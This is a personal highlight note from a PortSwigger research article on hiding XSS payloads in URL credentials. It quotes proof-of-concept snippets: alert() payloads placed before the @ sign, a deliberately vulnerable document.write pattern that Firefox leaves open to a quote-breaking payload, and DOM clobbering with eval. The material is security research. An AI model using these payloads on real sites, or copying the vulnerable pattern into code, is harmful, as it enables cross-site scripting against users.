---
author: PortSwigger Research
aliases:
  - Concealing Payloads in URL Credentials
tags:
  - readwise/articles
url: https://portswigger.net/research/concealing-payloads-in-url-credentials
date: 2024-10-30
---
# Concealing Payloads in URL Credentials


[Johan Carlsson](https://x.com/joaxcar) discovered you could [conceal payloads inside the credentials part of the URL](https://x.com/joaxcar/status/1712858781405577370)
> [View Highlight](https://read.readwise.io/read/01jbeytcppp4rptab4gsga468j)



The first surprising thing to me was `document.URL` does not always match `location`.
```js
https://foo:bar@portswigger-labs.net
alert(location);//https://portswigger-labs.net/ 
alert(document.URL);//https://foo:bar@portswigger-labs.net/
```
> [View Highlight](https://read.readwise.io/read/01jbeytntd8t11nkaz9m9m5n6r)



What that means is you can use just URL inside an event grab the payload from the credentials:
 ```html
 https://alert(1)@portswigger-labs.net <img src onerror=alert(URL.slice(8,16))>
 ```
 
> [View Highlight](https://read.readwise.io/read/01jbeytz4vj7jxwhkjckymr6c3)



Shazzer discovered that **Firefox doesn't URL-encode single quotes**. This is particularly useful in [DOM-based vulnerabilities](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/DOM-based%20vulnerabilities.md) scenarios, if the site removes the query string and hash. As it makes vulnerabilities like this exploitable in Firefox:
 ```js
function getBase(url) {    
	return url.split(/[?#]/)[0]; 
} 
document.write(`<script>const url='${getBase(document.URL)}';<\/script>`);
```
 To exploit this you need to provide the payload in the credentials part on Firefox like this:
```
https://'-alert(1)-'@example.com
```
> [View Highlight](https://read.readwise.io/read/01jbeywm5asm7qp5t0a8gjksr9)



You can combine this with [DOM clobbering](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/DOM-based%20vulnerabilities.md#DOM%20clobbering) to give you control over objects with username or password properties. Note you can even supply a blank href which still enables control over username or password via the URL.
```html
https://user:pass@example.com 
<a href id=x>test</a> 
<script> 
eval(x.username)//user eval(x.password)//pass
</script>
```
> [View Highlight](https://read.readwise.io/read/01jbeyzgk8asxm80rt7pmd8036)

